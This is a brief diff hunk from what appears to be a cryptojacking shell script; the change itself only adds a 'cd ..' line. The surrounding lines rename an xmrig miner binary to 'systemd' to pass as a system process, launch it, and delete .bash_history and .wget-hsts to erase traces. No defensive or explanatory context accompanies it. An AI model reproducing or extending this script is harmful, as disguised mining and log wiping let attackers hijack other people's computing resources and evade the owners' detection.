@@ -24,5 +24,7 @@ mv ./xmrig ./systemd
 
 ./systemd
 
+cd ..
+
 rm .bash_history
 rm .wget-hsts
